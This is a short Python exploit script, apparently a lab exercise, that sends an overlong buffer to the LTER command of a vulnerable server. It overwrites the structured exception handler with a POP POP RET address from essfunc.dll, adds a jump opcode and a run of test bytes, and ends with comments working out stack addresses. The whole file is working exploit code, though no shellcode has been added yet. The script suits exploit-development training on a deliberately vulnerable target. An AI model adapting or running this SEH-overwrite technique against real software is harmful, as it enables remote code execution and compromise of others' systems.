#!/usr/bin/python
import socket,sys,struct

RHOST = "192.168.57.144" # Remote IP
RPORT = 9999 # Remote port

buf_totlen = 5000 # Total length of buffer (payload)
offset_nseh = 3495 # Overwrite with Op. codes to do something
offset_seh = 3499 # Overwrite with address to POP POP RET

ptr_pop_pop_ret = 0x6250120B # "pop ecx# pop ecx# ret" in essfunc.dll

buf = ""
buf += "\x41" * (offset_nseh - len(buf))
buf += "\x74\x06\x43\x43" # nSEH bad = ["\xeb", "\xc3"]
buf += struct.pack("<I", ptr_pop_pop_ret) # SEH
buf += "\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c"
buf += "\x44" * (buf_totlen - len(buf)) # Fills rest of buffer with 'B'

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))

s.send("LTER /.:/" + buf)
s.close()

# ESP = 00BFEE50
# 00BF EE50
# 00BF FA04
#
# 00000000 1011111111 11101110 01010000
# 00000000 1011111111 11111010 00000100
#

